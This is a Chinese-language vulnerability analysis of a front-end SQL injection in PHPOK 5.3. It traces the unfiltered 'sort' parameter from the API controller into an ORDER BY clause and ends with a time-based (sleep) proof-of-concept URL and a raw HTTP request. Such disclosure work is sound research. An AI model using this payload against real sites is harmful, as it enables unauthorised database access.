<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>PHPOK 5.3 前台无限制注入</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>PHPOK 5.3</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>注入点：framework/model/list.php#arc_all</p><p>public function arc_all($project,$condition='',$field='*',$offset=0,$psize=0,$orderby='')<br />    {<br />        if($this-&gt;_total &gt; 100000 &amp;&amp; $offset &gt; 10000){<br />            return $this-&gt;_arc_all($project,$condition,$field,$offset,$psize,$orderby);<br />        }<br />        $sql  = " SELECT ".$field." FROM ".$this-&gt;db-&gt;prefix."list l ";<br />        $sql .= &quot; JOIN &quot;.$this-&gt;db-&gt;prefix.&quot;list_&quot;.$project['module'].&quot; ext &quot;;<br />        $sql .= " ON(l.id=ext.id AND l.site_id=ext.site_id AND l.project_id=ext.project_id) ";<br />        if($project['is_biz']){<br />            $sql .= " LEFT JOIN ".$this-&gt;db-&gt;prefix."list_biz b ON(b.id=l.id) ";<br />        }<br />        if($project['cate'] &amp;&amp; $project['cate_multiple']){<br />            $sql.= " LEFT JOIN ".$this-&gt;db-&gt;prefix."list_cate lc ON(l.id=lc.id) ";<br />        }<br />        if($condition){<br />            $sql .= " WHERE ".$condition." ";<br />        }<br />        // 拼接$orderby参数<br />        if($orderby){<br />            $sql .= " ORDER BY ".$orderby." ";<br />        }<br />        if($psize){<br />            $sql .= " LIMIT ".intval($offset).",".$psize;<br />        }<br />        //注入<br />        $rslist = $this-&gt;db-&gt;get_all($sql,'id');<br />        if(!$rslist){<br />            return false;<br />        }<br />        return $this-&gt;_arc_list_format($rslist,$project);<br />    }<br />回溯寻找调用链：framework/phpok_call.php#_arclist<br /><br />private function _arclist($rs,$cache_id='')<br />{<br />    // 264行<br />    $orderby = $rs['orderby'] ? $rs['orderby'] : $project['orderby'];<br /><br />    // 270行 调用arc_all函数，将$orderby传入<br />    $rslist = $this-&gt;model('list')-&gt;arc_all($project,$condition,$field,$offset,$psize,$orderby);</p><p>回溯：framework/api/project_control.php#load_module</p><p>private function load_module($rs,$parent_rs='')<br />{<br />    // 91行<br />    $keywords = $this-&gt;get("keywords");<br />    $ext = $this-&gt;get("ext");<br />    $tag = $this-&gt;get("tag");<br />    $uid = $this-&gt;get('uid','int');<br />    $attr = $this-&gt;get('attr');<br />    //价格，支持价格区间<br />    $price = $this-&gt;get('price','float');<br />    $sort = $this-&gt;get('sort');<br /><br />    //186行<br />    if($sort){<br />        $dt['orderby'] = $sort;  // 可控<br />        $pageurl .= '&amp;sort='.rawurlencode($sort);<br />        $this-&gt;rlist['sort'] = $sort;<br />    }<br />    // 208行，通过phpok函数动态调用_arclist()函数<br />        $info = $this-&gt;call-&gt;phpok('_arclist',$dt);</p><p>继续回溯，找谁调用了load_module()：framework/api/project_control.php#index_f</p><p>public function index_f()<br />{<br />    //65行<br />        if($project["module"]){<br />        $this-&gt;load_module($project,$parent_rs);<br />    }<br />}</p><p>在控制器里以_f结尾的函数都可以直接被调用</p><p>构造poc:</p><p>http://0-sec.org/api.php?c=project&amp;f=index&amp;token=1234&amp;id=news&amp;sort=(sleep(5))</p><h3>漏洞复现</h3><p>poc</p><p>GET /api.php?c=project&amp;f=index&amp;token=1234&amp;id=news&amp;sort=(sleep(5)) HTTP/1.1<br />Host: phpok5_3_147<br />Pragma: no-cache<br />Cache-Control: no-cache<br />Upgrade-Insecure-Requests: 1<br />User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3833.131 Safari/537.36<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<br />Accept-Encoding: gzip, deflate<br />Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7<br />Cookie: PHPSESSION=l87bngd1u307g20iudfmphisu4; XDEBUG_SESSION=PHPSTORM<br />Connection: close</p><h2>四、参考链接</h2><p><a href="https://xz.aliyun.com/t/6831">https://xz.aliyun.com/t/6831</a></p></body></html>